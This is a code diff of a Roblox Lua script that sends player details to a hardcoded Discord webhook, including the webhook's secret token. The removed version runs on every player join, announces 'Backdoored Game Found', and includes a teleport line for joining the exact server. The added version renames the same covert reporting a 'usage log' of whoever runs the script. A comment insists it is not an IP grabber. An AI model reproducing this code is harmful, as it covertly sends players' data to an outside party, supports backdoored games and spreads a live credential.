@@ -1,41 +1,55 @@
--- Dont worry it just sends stuff you can get publicly this isnt a IP Grabber
-
-local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
+--[[ Dont worry it just sends stuff you can get publicly this isnt a IP Grabber ]]
+--// Services
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 
-local webhookURL = "https://discord.com/api/webhooks/1417559424473632891/Ynt5h8wFB8LyFLu-eyZVE1ZlGCbPUayAM4NKlSMbCNdZ_ZjGBDnDPvbERU7gVARJOwr6"
+--// Your webhook URL
+local WebhookURL = "https://discord.com/api/webhooks/1417559424473632891/Ynt5h8wFB8LyFLu-eyZVE1ZlGCbPUayAM4NKlSMbCNdZ_ZjGBDnDPvbERU7gVARJOwr6"
 
-local function getGameUrl()
-	local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-	local placeId = game.PlaceId
-	local formattedName = placeName:lower():gsub("%s+", "-"):gsub("[^a-z0-9%-]", "")
-	return "https://www.roblox.com/games/" .. placeId .. "/" .. formattedName
+local function SendUsageLog(player)
+    local userId = player.UserId
+    local username = player.Name
+    local displayName = player.DisplayName
+
+    -- Roblox headshot
+    local thumbType = Enum.ThumbnailType.HeadShot
+    local thumbSize = Enum.ThumbnailSize.Size420x420
+    local pfpUrl, _ = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+    local gameId = game.PlaceId
+    local profileUrl = "https://www.roblox.com/users/"..userId.."/profile"
+    local gameUrl = "https://www.roblox.com/games/"..gameId
+
+    local data = {
+        username = displayName,
+        avatar_url = pfpUrl,
+        embeds = {{
+            title = "Script Executed",
+            description = "**"..displayName.."** (@"..username..") executed the script.",
+            color = 5814783,
+            fields = {
+                {
+                    name = "User Profile",
+                    value = "[View Profile]("..profileUrl..")",
+                    inline = true
+                },
+                {
+                    name = "Game Link",
+                    value = "[View Game]("..gameUrl..")",
+                    inline = true
+                }
+            },
+            footer = {
+                text = "User ID: "..tostring(userId)
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local json = HttpService:JSONEncode(data)
+    HttpService:PostAsync(WebhookURL, json, Enum.HttpContentType.ApplicationJson, false)
 end
 
-local function sendWebhook(player)
-	local gameUrl = getGameUrl()
-	local embed = {
-		title = "USER DATA LOCATED",
-		description = "Backdoored Game Found",
-		color = 3447003,
-		fields = {
-			{ name = "Name:", value = player.Name },
-			{ name = "UserId:", value = tostring(player.UserId) },
-			{ name = "Game:", value = gameUrl },
-			{ name = "Account Age:", value = tostring(player.AccountAge) },
-			{ name = "Place:", value = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)' }
-		},
-		footer = { text = "Webhook System :P" }
-	}
-	local data = { embeds = { embed }, content = "" }
-	local jsonData = HttpService:JSONEncode(data)
-
-	pcall(function()
-		HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson, false)
-	end)
-end
-
-Players.PlayerAdded:Connect(function(plr)
-	sendWebhook(plr)
-end)
+--// Trigger when executed
+local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+SendUsageLog(player)
